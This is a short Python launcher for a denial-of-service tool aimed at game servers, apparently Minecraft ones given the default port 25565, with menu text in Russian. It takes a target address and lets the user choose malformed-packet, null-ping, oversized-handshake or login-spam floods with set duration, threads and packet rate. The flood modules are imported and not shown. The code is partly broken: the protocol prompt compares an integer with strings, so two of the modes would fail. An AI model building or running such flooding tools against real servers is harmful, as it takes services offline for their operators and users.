from packet import malformed_packet
from packet import null_ping
from packet import big_handshake
from packet import login_spam
from packet import double_login
import os

def title(text):os.system("cls");print(((os.get_terminal_size().columns//2-len(text)//2)*" ")+text)




title("--- Айпи Адрес ---")

ip = input("Айпи: ")

if ip.rfind(":") == -1:
	address = ip
	port = 25565
else:
	s = ip.split(":")
	address = s[0]
	port = int(s[1])




title("--- Способ ---")

modules = ["отправляет искаженные пакеты",
		   "отправляет чуть сломанные пакеты",
		   "отправляет огромные пакеты",
		   "спамит авторизацией",
		   "спамит двойной авторизацией"]

n = 1
for i in modules:
	print(f"{n}. {i}")
	n += 1
print("")

module = int(input("Способ (1-5): "))-1




title("--- Другие параметры ---")

time = int(input("Время в секундах: "))
threads = int(input("Потоки: "))
pps = int(input("Пакетов в секунду: "))
if module in ["login_spam","double_login"]:
	protocol = input("Протокол: ")




title("--- Запуск ---")

if module == 0:
    malformed_packet.MalformedPacket(time,threads,address,port,pps)
elif module == 1:
    null_ping.NullPing(time,threads,address,port,pps)
elif module == 2:
    big_handshake.BigHandshake(time,threads,address,port,pps)
elif module == 3:
	login_spam.LoginSpam(time,threads,address,port,pps,protocol)
elif module == 4:
    double_login.DoubleLogin(time,threads,address,port,pps,protocol)
